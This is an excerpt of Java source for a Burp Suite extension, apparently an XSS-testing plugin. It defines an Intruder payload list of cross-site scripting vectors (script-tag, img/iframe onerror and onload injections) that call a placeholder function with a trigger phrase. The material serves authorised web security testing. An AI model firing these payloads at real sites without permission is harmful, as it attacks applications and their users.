...
public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor	{
    ...
    public static final byte[][] PAYLOADS = {
		...
		("<<SCRIPT>{FUNCTION}('" + triggerPhrase + "')//<</SCRIPT>").getBytes(),
		("<<SCRIPT>{FUNCTION}(\"" + triggerPhrase + "\")//<</SCRIPT>").getBytes(),
		("<img src=\"1\" onerror=\"{FUNCTION}('" + triggerPhrase + "')\">").getBytes(),
		("<img src='1' onerror='{FUNCTION}(\\'' + triggerPhrase + '\\')>").getBytes(),
		("onerror=\"{FUNCTION}('" + triggerPhrase + "')\"").getBytes(),
		("onerror='{FUNCTION}(\\'" + triggerPhrase + "\\')").getBytes(),
		("onload=\"{FUNCTION}(\"" + triggerPhrase + "\")").getBytes(),
		("onload='{FUNCTION}(\\'" + triggerPhrase + "\\')").getBytes(),
		("<IMG \"\"\"><SCRIPT>{FUNCTION}(\"" + triggerPhrase + "\")</SCRIPT>\">").getBytes(),
		("<IMG '''><SCRIPT>{FUNCTION}('" + triggerPhrase + "')</SCRIPT>'>").getBytes(),
		("\"\"\"><SCRIPT>{FUNCTION}(\"" + triggerPhrase + "\")</SCRIPT>").getBytes(),
		("'''><SCRIPT>{FUNCTION}('" + triggerPhrase + "')</SCRIPT>'").getBytes(),
		("<IFRAME SRC='f' onerror=\"{FUNCTION}(\"" + triggerPhrase + "\")\"></IFRAME>").getBytes(),
		("<IFRAME SRC='f' onerror='{FUNCTION}(\'" + triggerPhrase + "\')'></IFRAME>").getBytes()
    };
